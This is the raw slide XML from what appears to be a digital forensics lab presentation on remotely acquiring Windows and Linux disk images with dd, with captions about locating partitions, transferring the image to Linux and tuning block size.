          <p:cNvPr id="6" name="Picture 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{946E9C86-C04E-4E0A-0602-8798156821E0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:srcRect r="28972"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6497985" y="2658600"/>
            <a:ext cx="5044748" cy="2232853"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0ED303AB-928C-FDE9-2D2C-A7E46F417E6A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="649267" y="1943811"/>
            <a:ext cx="5435399" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent4"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Check both Linux and Windows disk space</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="721033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9AC06-5DAB-6608-864D-229DC20D6D82}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Remote disk acquisition: Linux</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{08FCF13D-F288-20AB-442F-827D4B6C6E3A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="932477" y="2020793"/>
            <a:ext cx="7330243" cy="3234698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7CF162EC-2761-6600-AD7E-F121387C3BE5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="932477" y="1651461"/>
            <a:ext cx="2971800" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent4"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Waiting for the disk image file</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2027909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9D65-9DF8-F7F2-1B1B-049FD611AA11}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="365125"/>
            <a:ext cx="4752372" cy="1809115"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Remote disk acquisition: Windows partitions  </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{62881B66-4B81-1ACF-65FA-6980E0E0391B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6547556" y="0"/>
            <a:ext cx="5644444" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48E6D223-798C-F454-F033-12D994AFEF71}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4719382" y="2013854"/>
            <a:ext cx="1562479" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent4"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Locate C: drive</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="8" name="Straight Arrow Connector 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C434AA5D-C42F-8B16-E041-CDEDD682F9D5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6016166" y="2466690"/>
            <a:ext cx="537140" cy="25958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A8A558B8-0F76-E730-5B37-997FD1383DB7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3566160" y="4352755"/>
            <a:ext cx="1562479" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent4"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Locate partitions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="10" name="Straight Arrow Connector 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FEFD9AA8-E79C-D886-D9C9-99EF98B002BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5128639" y="4610100"/>
            <a:ext cx="1493141" cy="49530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6" name="Rectangle 25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AB484339-D62B-E293-71D0-F7B945F4A5DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6547555" y="4999085"/>
            <a:ext cx="2760567" cy="651437"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:no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353B8AC-8D3A-9381-B87A-23A680B56CCC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3030630" y="5105400"/>
            <a:ext cx="3516924" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>\\?\Device\Harddisk0\Partition0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28012165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BC3-6B24-BE8D-3D1C-73A79254C6AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Remote disk acquisition: Windows </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{26C5D981-FB6B-46F8-B0DA-39F6D3ABBDA9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="2185754"/>
            <a:ext cx="7692655" cy="4054790"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1A758E8F-9529-83E9-FC6E-07973B29CF4F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1753555"/>
            <a:ext cx="7185660" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent4"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Acquire Windows disk partition 0 and transfer to Linux</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{06FF581B-04E7-DFB8-95FA-8F15BEB1AAF9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4257040" y="4033520"/>
            <a:ext cx="2435154" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent4">
              <a:lumMod val="20000"/>
              <a:lumOff val="80000"/>
            </a:schemeClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>make sure download </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dd</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3319529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6DCA68-8CDF-B86A-BF73-B27A89541A72}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1518439" y="1559363"/>
            <a:ext cx="6873836" cy="4229467"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ABF38C7E-082B-CFE2-611F-DDE1BEBEFBE8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1518439" y="1136335"/>
            <a:ext cx="4783301" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent4"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Verify that Linux is receiving the disk image</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C2BF51FF-C4B5-A2BA-1467-764C0C166AAB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8983980" y="4411980"/>
            <a:ext cx="2544030" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>receiving disk image data</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="8" name="Straight Arrow Connector 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8040E382-8714-D57E-237E-F7548A8A301E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:stCxn id="6" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="7429500" y="4596646"/>
            <a:ext cx="1554480" cy="34873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498452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3D378A-AFCC-D35F-050C-D078045D6F13}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="860033" y="1758863"/>
            <a:ext cx="7563023" cy="4467236"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A6B10886-96E9-34C2-74DC-D06E3EBB0695}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="935447" y="1112532"/>
            <a:ext cx="7185660" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent4"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Acquire Windows disk partition 0 and transfer to Linux (Alternative disk with a different block size)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2379574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286AA-2B10-D9A2-426A-937A6DD0CC61}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Issue: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Remote disk acquisition is slow</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{53639784-5B47-3BD7-91A3-E71C0DD7D0E6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>The optimal block size (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>bs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> value) depends on various factors</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Type of storage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>I/O patterns</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>System characteristics. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Solution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Experimentation to find the best value</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>The best solution  (only works when using dd in Linux)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Write a script to automate the experiments</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14286023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EB88E-301C-54EC-D75E-13FEE35CE741}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Auto speed testing (only </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> in Linux)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{45FBC929-7C0D-02F1-D1D0-1CB5FDAAD60D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="2304933"/>
            <a:ext cx="9664818" cy="3333233"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AB9D8777-26DC-8028-CBFC-0E92D290F2A8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1954635"/>
            <a:ext cx="3874202" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent4"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Download the speeding test shell script</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3953285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6D4A0C-6196-5F72-DD58-6C2F4A83DE0A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="2429546"/>
            <a:ext cx="6995766" cy="1844200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{690D8DB5-62A0-1BAC-7ACD-CB075E021C8B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1990494"/>
            <a:ext cx="4835298" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent4"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Change it to executable and verify test shell script</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="143809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DAF7C2B-412C-9555-F519-CB98ADF8C5A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
